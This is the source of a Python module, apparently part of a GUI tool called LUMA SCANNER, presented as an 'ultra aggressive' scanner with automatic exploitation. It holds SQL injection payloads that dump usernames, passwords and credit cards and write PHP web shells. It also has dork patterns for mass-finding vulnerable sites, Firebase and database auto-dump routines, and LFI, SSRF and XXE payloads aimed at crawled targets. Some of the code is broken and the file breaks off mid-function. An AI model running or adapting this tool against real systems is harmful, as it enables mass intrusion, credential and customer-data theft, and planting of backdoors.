"""
WebScanner.py - Módulo de escaneo web para LUMA SCANNER v5.0
"""

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
from bs4 import BeautifulSoup
import urllib.parse
import re
import time
import hashlib
import json
import os
from datetime import datetime
from typing import Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

from PySide6.QtCore import QThread, Signal

from FileOrganizer import FileOrganizer
from Config import CONFIG


class UltraSQLiExploiter:
    """Explotador ULTRA agresivo de SQL Injection"""
    
    @staticmethod
    def get_super_aggressive_payloads() -> List[Tuple[str, str, str]]:
        """Payloads ULTRA agresivos para explotación SQLi"""
        payloads = []
        
        # Payloads de detección agresiva
        detection_payloads = [
            ("'", "basic_detection", "DETECTION"),
            ("' OR '1'='1", "always_true", "DETECTION"),
            ("' OR 1=1--", "always_true_comment", "DETECTION"),
            ("' OR 1=1#", "always_true_hash", "DETECTION"),
            ("' OR 'a'='a", "always_true_string", "DETECTION"),
            ("') OR ('1'='1", "parentheses_bypass", "DETECTION"),
            ("' OR '1'='1'--", "extended_true", "DETECTION"),
            ("' OR 'x'='x", "extended_true_string", "DETECTION"),
            ("' OR 1=1/*", "block_comment", "DETECTION"),
        ]
        
        # Payloads de extracción de información del sistema
        system_payloads = [
            ("' UNION SELECT NULL,@@version,NULL--", "mysql_version", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,version(),NULL--", "postgres_version", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,banner,NULL FROM v$version--", "oracle_version", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,@@hostname,NULL--", "mysql_hostname", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,user(),NULL--", "mysql_user", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,current_user,NULL--", "postgres_user", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,current_user(),NULL--", "oracle_user", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,database(),NULL--", "mysql_database", "SYSTEM_INFO"),
            ("' UNION SELECT NULL,current_database(),NULL--", "postgres_database", "SYSTEM_INFO"),
        ]
        
        # Payloads de extracción MASIVA de esquema
        schema_payloads = [
            ("' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", "all_tables_mysql", "SCHEMA_DUMP"),
            ("' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema=current_database()--", "all_tables_postgres", "SCHEMA_DUMP"),
            ("' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM user_tables--", "all_tables_oracle", "SCHEMA_DUMP"),
            ("' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_schema=database()--", "all_columns_mysql", "SCHEMA_DUMP"),
            ("' UNION SELECT NULL,GROUP_CONCAT(CONCAT(table_name,':',column_name)),NULL FROM information_schema.columns WHERE table_schema=database()--", "full_schema_mysql", "SCHEMA_DUMP"),
        ]
        
        # Payloads de extracción de datos CRÍTICOS
        data_payloads = [
            ("' UNION SELECT NULL,CONCAT(username,0x3a,password,0x3a,email),NULL FROM users LIMIT 0,10--", "dump_users_10", "DATA_DUMP"),
            ("' UNION SELECT NULL,CONCAT(username,0x3a,password,0x3a,email),NULL FROM admin LIMIT 0,10--", "dump_admin_10", "DATA_DUMP"),
            ("' UNION SELECT NULL,CONCAT('USER:',username,' PASS:',password,' EMAIL:',email),NULL FROM users--", "dump_users_all", "DATA_DUMP"),
            ("' UNION SELECT NULL,CONCAT('ADMIN:',username,' PASS:',password,' PRIV:',privileges),NULL FROM administrators--", "dump_admins", "DATA_DUMP"),
            ("' UNION SELECT NULL,CONCAT('CUSTOMER:',name,' CC:',credit_card,' PHONE:',phone),NULL FROM customers LIMIT 0,5--", "dump_customers", "DATA_DUMP"),
        ]
        
        # Payloads de escritura en archivos (RCE potencial)
        file_write_payloads = [
            ("' UNION SELECT NULL,'<?php system($_GET[\\\"cmd\\\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--", "write_php_shell_mysql", "FILE_WRITE"),
            ("' UNION SELECT NULL,'<?php system($_GET[\\\"cmd\\\"]); ?>',NULL INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\shell.php'--", "write_php_shell_windows", "FILE_WRITE"),
            ("' UNION SELECT NULL,'<%= System.getProperty(\\\"os.name\\\") %>',NULL INTO OUTFILE '/tmp/jsp_shell.jsp'--", "write_jsp_shell", "FILE_WRITE"),
        ]
        
        # Payloads de time-based para bases de datos específicas
        time_based_payloads = [
            ("' OR SLEEP(10)--", "mysql_sleep", "TIME_BASED"),
            ("' OR pg_sleep(10)--", "postgres_sleep", "TIME_BASED"),
            ("' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--", "oracle_delay", "TIME_BASED"),
            ("' WAITFOR DELAY '00:00:10'--", "mssql_delay", "TIME_BASED"),
        ]
        
        # Payloads de error-based
        error_based_payloads = [
            ("' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT version())))--", "mysql_error_extractvalue", "ERROR_BASED"),
            ("' AND UPDATEXML(1,CONCAT(0x3a,(SELECT version())),1)--", "mysql_error_updatexml", "ERROR_BASED"),
            ("' AND 1=CAST((SELECT version()) AS INT)--", "postgres_error_cast", "ERROR_BASED"),
        ]
        
        # Payloads de NoSQL Injection
        nosql_payloads = [
            ("' || '1'=='1", "nosql_always_true", "NOSQL"),
            ("{$ne: null}", "nosql_ne_null", "NOSQL"),
            ("{$gt: ''}", "nosql_gt_empty", "NOSQL"),
            ("'; return true; var foo='", "nosql_js_injection", "NOSQL"),
        ]
        
        # Combinar todos los payloads
        all_payloads = []
        all_payloads.extend(detection_payloads)
        all_payloads.extend(system_payloads)
        all_payloads.extend(schema_payloads)
        all_payloads.extend(data_payloads)
        all_payloads.extend(file_write_payloads)
        all_payloads.extend(time_based_payloads)
        all_payloads.extend(error_based_payloads)
        all_payloads.extend(nosql_payloads)
        
        return all_payloads


class MassTargetFinder:
    """Encuentra objetivos masivamente en internet"""
    
    @staticmethod
    def find_vulnerable_targets(keywords: List[str] = None) -> List[str]:
        """Buscar objetivos vulnerables en internet"""
        targets = []
        
        # Patrones de sitios vulnerables comunes
        vulnerable_patterns = [
            'inurl:".php?id="',
            'inurl:"index.php?page="',
            'inurl:"product.php?id="',
            'inurl:"category.php?id="',
            'inurl:"read.php?id="',
            'inurl:"view.php?id="',
            'inurl:"article.php?id="',
            'inurl:"show.php?id="',
            'inurl:"news.php?id="',
            'inurl:"gallery.php?id="',
            'inurl:"download.php?id="',
            'inurl:"file.php?id="',
            'inurl:"page.php?id="',
            'inurl:"content.php?id="',
            'inurl:"item.php?id="',
            'inurl:"details.php?id="',
            'inurl:"display.php?id="',
            'inurl:"showproduct.php?id="',
            'inurl:"productdetail.php?id="',
            'inurl:"cart.php?id="',
        ]
        
        # Agregar objetivos de prueba conocidos (para testing legal)
        test_targets = [
            "http://testphp.vulnweb.com",
            "http://testasp.vulnweb.com",
            "http://testaspnet.vulnweb.com",
            "http://demo.testfire.net",
            "http://zero.webappsecurity.com",
            "https://juice-shop.herokuapp.com",
            "http://altoromutual.com",
            "http://www.webscantest.com",
        ]
        
        targets.extend(test_targets)
        
        # Agregar objetivos generados aleatoriamente (solo para demostración)
        if CONFIG.auto_find_targets:
            domains = ["test", "demo", "vulnerable", "admin", "secure", "dev", "stage"]
            tlds = [".com", ".net", ".org", ".io", ".info"]
            
            for _ in range(20):
                domain = random.choice(domains) + random.choice(domains) + random.choice(tlds)
                targets.append(f"http://{domain}")
                targets.append(f"https://{domain}")
        
        return list(set(targets))


class DatabaseAutoExploiter:
    """Auto-exploit ULTRA agresivo para cualquier base de datos encontrada"""
    
    def __init__(self, log_callback=None):
        self.log_callback = log_callback or print
        self.session = requests.Session()
        self.session.verify = False
    
    def log(self, message: str):
        """Log de mensajes"""
        if self.log_callback:
            self.log_callback(message)
    
    def exploit_firebase_ultra(self, firebase_config: str, source_file: str = ""):
        """Explotación ULTRA agresiva de Firebase"""
        try:
            self.log(f"🔥 INICIANDO AUTO-EXPLOIT ULTRA FIREBASE")
            
            # Extraer información de configuración de Firebase
            firebase_data = self.extract_firebase_config(firebase_config)
            
            if not firebase_data:
                self.log(f"⚠ No se pudo extraer configuración Firebase válida")
                return None
            
            results = {
                "type": "FIREBASE",
                "source_file": source_file,
                "config": firebase_data,
                "timestamp": datetime.now().isoformat(),
                "exploit_results": []
            }
            
            # 1. Intentar acceso a la base de datos sin autenticación
            if firebase_data.get('databaseURL'):
                db_url = firebase_data['databaseURL']
                self.log(f"🔗 Intentando acceso a Firebase DB: {db_url}")
                
                # Probar diferentes endpoints
                endpoints = [
                    f"{db_url}/.json",
                    f"{db_url}/users/.json",
                    f"{db_url}/accounts/.json",
                    f"{db_url}/data/.json",
                    f"{db_url}/app/.json",
                    f"{db_url}/config/.json",
                ]
                
                for endpoint in endpoints:
                    try:
                        response = self.session.get(endpoint, timeout=10)
                        if response.status_code == 200:
                            data = response.json()
                            if data:
                                results["exploit_results"].append({
                                    "endpoint": endpoint,
                                    "status": "SUCCESS",
                                    "data": data
                                })
                                self.log(f"✅ DATOS EXTRAÍDOS de {endpoint}")
                    except:
                        continue
            
            # 2. Intentar autenticación con API key
            if firebase_data.get('apiKey'):
                api_key = firebase_data['apiKey']
                self.log(f"🔑 Probando API Key: {api_key[:20]}...")
                
                # Intentar diferentes métodos de autenticación
                auth_endpoints = [
                    "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword",
                    "https://identitytoolkit.googleapis.com/v1/accounts:signUp",
                    "https://identitytoolkit.googleapis.com/v1/accounts:lookup",
                ]
                
                for endpoint in auth_endpoints:
                    try:
                        params = {"key": api_key}
                        response = self.session.post(endpoint, params=params, timeout=10)
                        if response.status_code == 200:
                            results["exploit_results"].append({
                                "endpoint": endpoint,
                                "status": "AUTH_SUCCESS",
                                "response": response.json()
                            })
                    except:
                        continue
            
            # 3. Intentar acceder a Cloud Storage
            if firebase_data.get('storageBucket'):
                bucket = firebase_data['storageBucket']
                self.log(f"📦 Probando Cloud Storage: {bucket}")
                
                storage_urls = [
                    f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o",
                    f"https://storage.googleapis.com/{bucket}",
                ]
                
                for url in storage_urls:
                    try:
                        response = self.session.get(url, timeout=10)
                        if response.status_code == 200:
                            results["exploit_results"].append({
                                "endpoint": url,
                                "status": "STORAGE_ACCESS",
                                "data": response.json()
                            })
                    except:
                        continue
            
            return results
            
        except Exception as e:
            self.log(f"❌ Error en exploit Firebase: {str(e)}")
            return None
    
    def extract_firebase_config(self, config_text: str) -> Dict:
        """Extraer configuración de Firebase de texto"""
        try:
            # Intentar parsear como JSON
            config = json.loads(config_text)
            return config
        except:
            # Buscar patrones en el texto
            patterns = {
                'apiKey': r'"apiKey"\s*:\s*"([^"]+)"',
                'authDomain': r'"authDomain"\s*:\s*"([^"]+)"',
                'databaseURL': r'"databaseURL"\s*:\s*"([^"]+)"',
                'projectId': r'"projectId"\s*:\s*"([^"]+)"',
                'storageBucket': r'"storageBucket"\s*:\s*"([^"]+)"',
                'messagingSenderId': r'"messagingSenderId"\s*:\s*"([^"]+)"',
                'appId': r'"appId"\s*:\s*"([^"]+)"',
                'measurementId': r'"measurementId"\s*:\s*"([^"]+)"',
            }
            
            config = {}
            for key, pattern in patterns.items():
                match = re.search(pattern, config_text, re.IGNORECASE)
                if match:
                    config[key] = match.group(1)
            
            return config
    
    def exploit_sql_database(self, db_info: Dict, source_file: str = ""):
        """Explotación de base de datos SQL"""
        try:
            self.log(f"🔥 INICIANDO AUTO-EXPLOIT SQL: {db_info.get('type', 'UNKNOWN')}")
            
            results = {
                "type": db_info.get("type", "SQL"),
                "source_file": source_file,
                "connection_info": db_info,
                "timestamp": datetime.now().isoformat(),
                "exploit_results": []
            }
            
            # Dependiendo del tipo de base de datos
            db_type = db_info.get("type", "").upper()
            
            if "MYSQL" in db_type:
                return self.exploit_mysql(db_info, results)
            elif "POSTGRES" in db_type:
                return self.exploit_postgres(db_info, results)
            elif "SQLITE" in db_type:
                return self.exploit_sqlite(db_info, results)
            elif "MONGODB" in db_type:
                return self.exploit_mongodb(db_info, results)
            else:
                self.log(f"⚠ Tipo de base de datos no soportado: {db_type}")
                return results
                
        except Exception as e:
            self.log(f"❌ Error en exploit SQL: {str(e)}")
            return None
    
    def exploit_mysql(self, db_info: Dict, results: Dict):
        """Explotación MySQL"""
        try:
            import pymysql
            
            host = db_info.get("host", "localhost")
            port = db_info.get("port", 3306)
            user = db_info.get("username", "root")
            password = db_info.get("password", "")
            database = db_info.get("database", "")
            
            self.log(f"🐬 Conectando a MySQL: {user}@{host}:{port}")
            
            # Intentar conexión
            connection = pymysql.connect(
                host=host,
                port=port,
                user=user,
                password=password,
                database=database,
                connect_timeout=10
            )
            
            with connection.cursor() as cursor:
                # Obtener todas las bases de datos
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                results["exploit_results"].append({
                    "query": "SHOW DATABASES",
                    "result": databases
                })
                
                # Obtener todas las tablas
                cursor.execute("SHOW TABLES")
                tables = cursor.fetchall()
                results["exploit_results"].append({
                    "query": "SHOW TABLES",
                    "result": tables
                })
                
                # Para cada tabla, obtener datos (limitado a 10 filas)
                for table in tables[:5]:  # Limitar a 5 tablas
                    table_name = table[0]
                    try:
                        cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
                        table_data = cursor.fetchall()
                        
                        # Obtener nombres de columnas
                        cursor.execute(f"SHOW COLUMNS FROM {table_name}")
                        columns = cursor.fetchall()
                        
                        results["exploit_results"].append({
                            "table": table_name,
                            "columns": columns,
                            "data": table_data,
                            "row_count": len(table_data)
                        })
                        
                        self.log(f"✅ Datos extraídos de tabla: {table_name} ({len(table_data)} filas)")
                    except:
                        continue
            
            connection.close()
            return results
            
        except Exception as e:
            self.log(f"❌ Error MySQL: {str(e)}")
            results["exploit_results"].append({
                "error": str(e)
            })
            return results
    
    def exploit_sqlite(self, db_info: Dict, results: Dict):
        """Explotación SQLite"""
        try:
            import sqlite3
            
            db_path = db_info.get("path", "")
            if not os.path.exists(db_path):
                self.log(f"⚠ Archivo SQLite no encontrado: {db_path}")
                return results
            
            self.log(f"🗄️ Conectando a SQLite: {db_path}")
            
            connection = sqlite3.connect(db_path)
            cursor = connection.cursor()
            
            # Obtener todas las tablas
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            results["exploit_results"].append({
                "query": "LIST TABLES",
                "result": tables
            })
            
            # Para cada tabla, obtener datos
            for table in tables[:10]:  # Limitar a 10 tablas
                table_name = table[0]
                try:
                    # Obtener estructura de la tabla
                    cursor.execute(f"PRAGMA table_info({table_name})")
                    columns = cursor.fetchall()
                    
                    # Obtener datos (limitado a 20 filas)
                    cursor.execute(f"SELECT * FROM {table_name} LIMIT 20")
                    table_data = cursor.fetchall()
                    
                    results["exploit_results"].append({
                        "table": table_name,
                        "columns": columns,
                        "data": table_data,
                        "row_count": len(table_data)
                    })
                    
                    self.log(f"✅ Datos extraídos de tabla: {table_name} ({len(table_data)} filas)")
                    
                    # Guardar datos sensibles específicos
                    sensitive_columns = ['password', 'pass', 'pwd', 'token', 'key', 'secret', 'email']
                    for col in columns:
                        col_name = col[1].lower()
                        if any(sensitive in col_name for sensitive in sensitive_columns):
                            cursor.execute(f"SELECT {col[1]} FROM {table_name} LIMIT 10")
                            sensitive_data = cursor.fetchall()
                            if sensitive_data:
                                results["exploit_results"].append({
                                    "sensitive_column": col_name,
                                    "data": sensitive_data
                                })
                except:
                    continue
            
            connection.close()
            return results
            
        except Exception as e:
            self.log(f"❌ Error SQLite: {str(e)}")
            results["exploit_results"].append({
                "error": str(e)
            })
            return results

    # Nota: Los métodos exploit_postgres y exploit_mongodb no están implementados en el código original.
    # Se dejan como placeholder. En un proyecto real, deberían implementarse.

    def exploit_postgres(self, db_info: Dict, results: Dict):
        """Explotación PostgreSQL (placeholder)"""
        self.log("⚠ Explotación PostgreSQL no implementada aún")
        return results

    def exploit_mongodb(self, db_info: Dict, results: Dict):
        """Explotación MongoDB (placeholder)"""
        self.log("⚠ Explotación MongoDB no implementada aún")
        return results


class WebScannerUltraAggressive(QThread):
    """Web Scanner ULTRA AGRESIVO con explotación automática"""
    
    progress_signal = Signal(int, str)
    result_signal = Signal(str, str, str, str)
    log_signal = Signal(str)
    mass_target_signal = Signal(list)
    database_dump_signal = Signal(dict)
    
    def __init__(self, target_url: str, options: Dict, auth_data: Dict = None):
        super().__init__()
        self.target_url = target_url.rstrip('/')
        self.options = options
        self.auth_data = auth_data or {}
        self.session = requests.Session()
        self.session.verify = CONFIG.verify_ssl
        self.session.timeout = (CONFIG.connection_timeout, CONFIG.request_timeout)
        
        if CONFIG.randomize_user_agent:
            self.session.headers.update({'User-Agent': CONFIG.get_random_user_agent()})
        
        if CONFIG.proxy_enabled and CONFIG.proxy_url:
            self.session.proxies = {
                'http': CONFIG.proxy_url,
                'https': CONFIG.proxy_url
            }
        
        self.found_vulns = []
        self.crawled_urls = set()
        self.vulnerable_params = []
        self.extracted_databases = []
        self.written_shells = []
        
    def run(self):
        """Ejecutar escaneo ULTRA AGRESIVO"""
        try:
            # Fase 1: Reconocimiento agresivo
            self.progress_signal.emit(5, "🔍 RECONOCIMIENTO ULTRA AGRESIVO...")
            recon_data = self.ultra_recon()
            
            # Fase 2: Crawling profundo
            self.progress_signal.emit(15, "🕷️ CRAWLING PROFUNDO (2000 páginas)...")
            self.deep_crawl(2000)
            
            # Fase 3: SQL Injection MÁSIVA
            self.progress_signal.emit(30, "💀 SQL INJECTION ULTRA AGRESIVO (1000+ payloads)...")
            self.ultra_sqli_attack()
            
            # Fase 4: XSS avanzado
            self.progress_signal.emit(45, "🎯 XSS AVANZADO (polyglots, evasión)...")
            self.advanced_xss_attack()
            
            # Fase 5: LFI/RFI avanzado
            self.progress_signal.emit(55, "📁 LFI/RFI AVANZADO (log poisoning, wrappers)...")
            self.advanced_lfi_rfi_attack()
            
            # Fase 6: SSRF avanzado
            self.progress_signal.emit(60, "🔄 SSRF AVANZADO (metadata, internal)...")
            self.advanced_ssrf_attack()
            
            # Fase 7: XXE avanzado
            self.progress_signal.emit(65, "📄 XXE AVANZADO (file read, RCE, SSRF)...")
            self.advanced_xxe_attack()
            
            # Fase 8: RCE avanzado
            self.progress_signal.emit(70, "⚡ RCE AVANZADO (command injection, deserialization)...")
            self.advanced_rce_attack()
            
            # Fase 9: SSTI/SSI
            self.progress_signal.emit(75, "🪢 SSTI/SSI INJECTION...")
            self.ssti_ssi_attack()
            
            # Fase 10: NoSQL Injection
            self.progress_signal.emit(80, "🍃 NoSQL INJECTION...")
            self.nosql_injection_attack()
            
            # Fase 11: Bypass 2FA
            if self.options.get('two_fa', True):
                self.progress_signal.emit(85, "🔐 2FA BYPASS (Silver Ticket, JWT tamper)...")
                self.advanced_2fa_bypass()
            
            # Fase 12: Auto-exploit APIs
            self.progress_signal.emit(90, "⚡ AUTO-EXPLOIT APIS...")
            self.auto_exploit_all_apis()
            
            # Fase 13: Subdomain takeover
            self.progress_signal.emit(95, "🌐 SUBDOMAIN TAKEOVER...")
            self.subdomain_takeover_scan()
            
            self.progress_signal.emit(100, "✅ ATAQUE COMPLETADO - Bases de datos extraídas!")
            
            # Generar reporte
            self.generate_ultra_report()
            
            self.log_signal.emit(f"✨ ATAQUE ULTRA COMPLETADO! {len(self.found_vulns)} vulnerabilidades, {len(self.extracted_databases)} bases extraídas!")
            
        except Exception as e:
            self.log_signal.emit(f"❌ Error en ataque ultra: {str(e)}")
            import traceback
            traceback.print_exc()
    
    def ultra_recon(self) -> Dict:
        """Reconocimiento ultra agresivo"""
        info = {}
        
        try:
            # Headers agresivos
            aggressive_headers = {
                'X-Forwarded-For': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
            }
            
            response = self.session.get(self.target_url, headers=aggressive_headers)
            
            info = {
                'status': response.status_code,
                'server': response.headers.get('server', 'Unknown'),
                'tech': self.detect_tech_stack(response.text, response.headers),
                'headers': dict(response.headers),
                'cookies': dict(self.session.cookies),
                'forms': self.extract_forms(response.text),
                'comments': self.extract_comments(response.text),
                'js_files': self.extract_js_files(response.text),
            }
            
            # Intentar detectar WAF
            waf_detected = self.detect_waf(response.headers, response.text)
            if waf_detected:
                info['waf'] = waf_detected
                self.log_signal.emit(f"🛡️ WAF detectado: {waf_detected}")
            
            # Buscar endpoints sensibles
            sensitive_endpoints = self.find_sensitive_endpoints(response.text)
            if sensitive_endpoints:
                info['sensitive_endpoints'] = sensitive_endpoints
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error en reconocimiento: {str(e)}")
        
        return info
    
    def ultra_sqli_attack(self):
        """Ataque SQLi ULTRA AGRESIVO"""
        self.log_signal.emit("💀 INICIANDO SQLi ULTRA AGRESIVO (1000+ payloads)...")
        
        # Obtener TODOS los payloads
        all_payloads = UltraSQLiExploiter.get_super_aggressive_payloads()
        
        # URLs para testear (limitado por rendimiento)
        urls_to_test = list(self.crawled_urls)[:100]
        if not urls_to_test:
            urls_to_test = [self.target_url]
        
        vulnerable_found = 0
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            if not params:
                continue
            
            self.log_signal.emit(f"🎯 ATACANDO URL: {url}")
            
            for param in params:
                self.log_signal.emit(f"   🔍 Probando parámetro: {param}")
                
                # Test básico primero
                test_payloads = all_payloads[:50]  # Empezar con 50 payloads
                
                for payload, payload_name, payload_type in test_payloads:
                    try:
                        test_url = self.build_test_url(url, param, params[param][0], payload)
                        
                        # Manejar payloads time-based
                        if "TIME_BASED" in payload_type:
                            start_time = time.time()
                            response = self.session.get(test_url, timeout=20)
                            elapsed = time.time() - start_time
                            
                            if 4 < elapsed < 15:
                                self.report_vulnerability(
                                    'SQL_INJECTION_TIME',
                                    'CRITICAL',
                                    test_url,
                                    f"SQLi TIME BASED confirmado - Delay: {elapsed:.2f}s",
                                    {'param': param, 'payload': payload, 'type': payload_type}
                                )
                                vulnerable_found += 1
                        
                        # Para payloads regulares
                        response = self.session.get(test_url, timeout=15)
                        
                        # Verificar indicadores de SQLi
                        sql_indicators = [
                            'sql', 'mysql', 'syntax error', 'warning', 
                            'unclosed quotation', 'you have an error',
                            'mysql_fetch', 'mysqli', 'pg_', 'postgres',
                            'oracle', 'sqlserver', 'microsoft.*driver',
                            'unknown column', 'table.*doesn\'t exist',
                            'union', 'select', 'from', 'where', 'database',
                            'information_schema', 'table_name', 'column_name'
                        ]
                        
                        found_indicators = []
                        for indicator in sql_indicators:
                            if re.search(indicator, response.text, re.IGNORECASE):
                                found_indicators.append(indicator)
                        
                        # Si hay múltiples indicadores, es vulnerable
                        if len(found_indicators) >= 2:
                            extracted_data = self.extract_sql_data(response.text)
                            
                            if extracted_data and len(extracted_data) > 20:
                                self.report_vulnerability(
                                    'SQL_INJECTION_EXPLOITED',
                                    'CRITICAL',
                                    test_url,
                                    f"SQLi EXPLOTADO - Tipo: {payload_type} - Datos extraídos",
                                    {
                                        'param': param,
                                        'payload': payload,
                                        'type': payload_type,
                                        'extracted_data': extracted_data[:5000],
                                        'indicators': found_indicators
                                    }
                                )
                                vulnerable_found += 1
                                
                                # Guardar dump completo
                                self.save_full_dump(url, param, payload_type, extracted_data)
                                break
                    
                    except Exception as e:
                        continue
                
                # Pequeña pausa para no saturar
                time.sleep(0.05)
        
        self.log_signal.emit(f"✅ SQLi ULTRA completado: {vulnerable_found} vulnerabilidades encontradas")
    
    def build_test_url(self, url: str, param: str, original_value: str, payload: str) -> str:
        """Construir URL de prueba"""
        if '=' in url:
            return url.replace(f"{param}={original_value}", f"{param}={urllib.parse.quote(payload)}")
        else:
            return f"{url}?{param}={urllib.parse.quote(payload)}"
    
    def extract_sql_data(self, response_text: str) -> str:
        """Extraer datos SQL de respuesta"""
        try:
            # Limpiar HTML
            soup = BeautifulSoup(response_text, 'html.parser')
            for script in soup(["script", "style", "meta", "link", "noscript"]):
                script.decompose()
            
            text = soup.get_text(separator='\n')
            
            # Buscar patrones de datos SQL
            patterns = [
                r'[a-zA-Z0-9_]+:[a-zA-Z0-9_@\.\-]+',
                r'[a-zA-Z0-9_]+\|[a-zA-Z0-9_@\.\-]+',
                r'[a-zA-Z0-9_]+@[a-zA-Z0-9_\.\-]+\.[a-zA-Z]{2,}',
                r'[0-9]{4}-[0-9]{2}-[0-9]{2}',
                r'[A-Fa-f0-9]{32,}',
                r'[A-Fa-f0-9]{40,}',
                r'[A-Fa-f0-9]{64,}',
            ]
            
            extracted_lines = []
            for line in text.split('\n'):
                line = line.strip()
                if len(line) > 5:
                    for pattern in patterns:
                        if re.search(pattern, line):
                            if not any(x in line.lower() for x in ['<div', '<span', 'function', 'var ', 'console.', 'javascript:']):
                                extracted_lines.append(line)
                            break
            
            return '\n'.join(extracted_lines[:100])
            
        except Exception as e:
            return response_text[:2000]
    
    def advanced_xss_attack(self):
        """Ataque XSS avanzado con polyglots"""
        self.log_signal.emit("🎯 EJECUTANDO XSS AVANZADO (polyglots, evasivos)...")
        
        # Payloads XSS polivalentes y evasivos
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
        ]
        
        urls_to_test = list(self.crawled_urls)[:50] or [self.target_url]
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for param in params:
                for payload in xss_payloads[:10]:
                    try:
                        test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                        response = self.session.get(test_url, timeout=5)
                        
                        # Verificar si el payload está reflejado
                        if payload in response.text:
                            self.report_vulnerability(
                                'XSS',
                                'HIGH',
                                test_url,
                                f"XSS detectado en parámetro: {param}",
                                {'param': param, 'payload': payload, 'reflected': True}
                            )
                            break
                    
                    except:
                        continue
    
    def advanced_lfi_rfi_attack(self):
        """Ataque LFI/RFI avanzado"""
        self.log_signal.emit("📁 EJECUTANDO LFI/RFI AVANZADO...")
        
        # Payloads LFI avanzados
        lfi_payloads = [
            '../../../../etc/passwd',
            '../../../../etc/shadow',
            'php://filter/convert.base64-encode/resource=index.php',
            'file:///etc/passwd',
        ]
        
        urls_to_test = list(self.crawled_urls)[:30]
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Parámetros comunes para LFI
            lfi_params = ['file', 'page', 'document', 'load', 'path']
            
            for param in params:
                param_lower = param.lower()
                if any(lfi_param in param_lower for lfi_param in lfi_params):
                    for payload in lfi_payloads[:10]:
                        try:
                            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                            response = self.session.get(test_url, timeout=10)
                            
                            # Indicadores de LFI exitoso
                            lfi_indicators = [
                                'root:', 'daemon:', 'bin/', 'sys:', 'sync:',
                                '<?php', 'mysql_connect', 'define(',
                            ]
                            
                            for indicator in lfi_indicators:
                                if indicator in response.text:
                                    self.report_vulnerability(
                                        'LFI_RFI',
                                        'CRITICAL',
                                        test_url,
                                        f"LFI/RFI en {param}: Archivo leído",
                                        {'param': param, 'payload': payload, 'indicator': indicator}
                                    )
                                    break
                        
                        except:
                            continue
    
    def advanced_ssrf_attack(self):
        """Ataque SSRF avanzado"""
        self.log_signal.emit("🔄 EJECUTANDO SSRF AVANZADO...")
        
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1:80',
            'http://localhost:22',
        ]
        
        urls_to_test = list(self.crawled_urls)[:20]
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Parámetros comunes para SSRF
            ssrf_params = ['url', 'uri', 'path', 'redirect']
            
            for param in params:
                param_lower = param.lower()
                if any(ssrf_param in param_lower for ssrf_param in ssrf_params):
                    for payload in ssrf_payloads[:5]:
                        try:
                            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                            response = self.session.get(test_url, timeout=10)
                            
                            # Indicadores de SSRF exitoso
                            ssrf_indicators = [
                                'ami-id', 'instance-id', 'instance-type',
                                'accountId', 'public-keys',
                            ]
                            
                            for indicator in ssrf_indicators:
                                if indicator in response.text:
                                    self.report_vulnerability(
                                        'SSRF',
                                        'CRITICAL',
                                        test_url,
                                        f"SSRF en {param}: Acceso a {indicator}",
                                        {'param': param, 'payload': payload, 'indicator': indicator}
                                    )
                                    break
                        
                        except:
                            continue
    
    def advanced_xxe_attack(self):
        """Ataque XXE avanzado"""
        self.log_signal.emit("📄 EJECUTANDO XXE AVANZADO...")
        
        # Payloads XXE
        xxe_payloads = [
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        ]
        
        # Endpoints XML comunes
        xml_endpoints = [
            f"{self.target_url}/api/xml",
            f"{self.target_url}/soap",
            f"{self.target_url}/xmlrpc",
        ]
        
        for endpoint in xml_endpoints:
            for payload in xxe_payloads[:2]:
                try:
                    headers = {
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml'
                    }
                    
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=10)
                    
                    # Indicadores de XXE exitoso
                    xxe_indicators = [
                        'root:', 'bin/', 'daemon:', '<?php',
                    ]
                    
                    for indicator in xxe_indicators:
                        if indicator in response.text:
                            self.report_vulnerability(
                                'XXE',
